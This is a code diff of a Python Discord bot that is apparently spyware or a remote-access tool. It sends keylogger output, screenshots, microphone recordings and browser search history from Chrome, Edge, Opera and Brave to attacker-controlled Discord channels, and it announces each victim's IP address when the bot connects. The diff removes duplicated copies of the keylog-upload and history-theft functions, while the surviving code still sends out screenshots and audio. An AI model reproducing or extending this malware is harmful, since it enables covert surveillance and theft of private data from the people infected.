@@ -11,7 +11,6 @@ load_dotenv(".env")
 
 keylogs_file = "files\\keys.txt"
 bot = commands.Bot(command_prefix=';', intents=discord.Intents.all())
-bot = commands.Bot(command_prefix=';', intents=discord.Intents.all())
 
 guild_id = os.getenv('SERVER_ID')
 screenshot_channel = os.getenv('SCREENSHOT_CHANNEL_ID')
@@ -60,44 +59,6 @@ async def sendScreen(ctx):
             os.remove(screenshot_path)
             time.sleep(0.1)
 
-async def sendLogs(ctx):
-    guild = await bot.fetch_guild(guild_id)
-    channel = await guild.fetch_channel(logger_channel)
-
-    with open(keylogs_file, 'rb') as logs_file:
-        await channel.send(file=discord.File(logs_file, keylogs_file)) 
-
-    with open(keylogs_file, "w") as f:
-        f.write("")
-            
-@bot.tree.command(name="gethistory", description="Send search history from different browsers")
-async def get_history(interaction: discord.Interaction, browser: str, days: int):
-    try:
-        browsers = ["chrome", "google", "edge", "opera", "opera gx", "brave", "microsoft edge"]
-        if browser.lower() in browsers:
-            if browser.lower() == "chrome" or browser.lower() == "google":
-                result, browser = searchhistory.get_chrome()
-            if browser.lower() == "edge" or browser.lower() == "microsoft edge":
-                result, browser = searchhistory.get_edge()
-            if browser.lower() == "opera" or browser.lower() == "opera gx":
-                result, browser = searchhistory.get_opera()
-            if browser.lower() == "brave":
-                result, browser = searchhistory.get_brave()
-
-            guild = await bot.fetch_guild(guild_id)
-            channel = await guild.fetch_channel(commands_channel)
-
-            with open(browser, 'rb') as screenshot_file:
-                await channel.send(file=discord.File(screenshot_file, browser))
-
-        if browser.lower() == "all":
-            result = searchhistory.get_all()
-            await interaction.response.send_message(result)
-        else:
-            await interaction.response.send_message("Invalid Browser, Try one of these:\n>>> Chrome/Google\nBrave\nOpera/Opera GX\nEdge/Microsoft Edge")
-    except Exception as e:
-        print(f"YOU FUCKED UP!!!\n{e}")
-
 @tasks.loop(seconds=0.1)
 async def check_files(ctx):
     while True:
@@ -106,59 +67,9 @@ async def check_files(ctx):
                 await sendScreen(ctx=ctx)
             if file.endswith(".wav"):
                 await sendMic(ctx=ctx)
-            with open(keylogs_file, "r") as f:
-                logs = f.readlines()
-                for lines in logs:
-                    if "SEC: 5" in lines:
-                        await sendLogs(ctx=ctx)
-
-            
-@bot.tree.command(name="gethistory", description="Send search history from different browsers")
-async def get_history(interaction: discord.Interaction, browser: str, days: int):
-    try:
-        browsers = ["chrome", "google", "edge", "opera", "opera gx", "brave", "microsoft edge"]
-        if browser.lower() in browsers:
-            if browser.lower() == "chrome" or browser.lower() == "google":
-                result, browser = searchhistory.get_chrome()
-            if browser.lower() == "edge" or browser.lower() == "microsoft edge":
-                result, browser = searchhistory.get_edge()
-            if browser.lower() == "opera" or browser.lower() == "opera gx":
-                result, browser = searchhistory.get_opera()
-            if browser.lower() == "brave":
-                result, browser = searchhistory.get_brave()
-
-            guild = await bot.fetch_guild(guild_id)
-            channel = await guild.fetch_channel(commands_channel)
-
-            with open(browser, 'rb') as screenshot_file:
-                await channel.send(file=discord.File(screenshot_file, browser))
-
-        if browser.lower() == "all":
-            result = searchhistory.get_all()
-            await interaction.response.send_message(result)
-        else:
-            await interaction.response.send_message("Invalid Browser, Try one of these:\n>>> Chrome/Google\nBrave\nOpera/Opera GX\nEdge/Microsoft Edge")
-    except Exception as e:
-        print(f"YOU FUCKED UP!!!\n{e}")
-
-@tasks.loop(seconds=0.1)
-async def check_files(ctx):
-    while True:
-        for file in os.listdir("files"):
-            if file.endswith(".png"):
-                await sendScreen(ctx=ctx)
-            if file.endswith(".wav"):
-                await sendMic(ctx=ctx)
-            with open(keylogs_file, "r") as f:
-                logs = f.readlines()
-                for lines in logs:
-                    if "SEC: 5" in lines:
-                        await sendLogs(ctx=ctx)
 
 @bot.event
 async def on_ready():
-    e = await bot.tree.sync()
-    print(e)
     e = await bot.tree.sync()
     print(e)
     guild = await bot.fetch_guild(guild_id)
@@ -168,7 +79,6 @@ async def on_ready():
     ip_address = socket.gethostbyname(hostname)
 
     await channel.send(f"{ip_address} connected at {time.strftime('%m/%d %H:%M:%S')}")
-    check_files.start(guild)
     check_files.start(guild)
 
 @bot.event
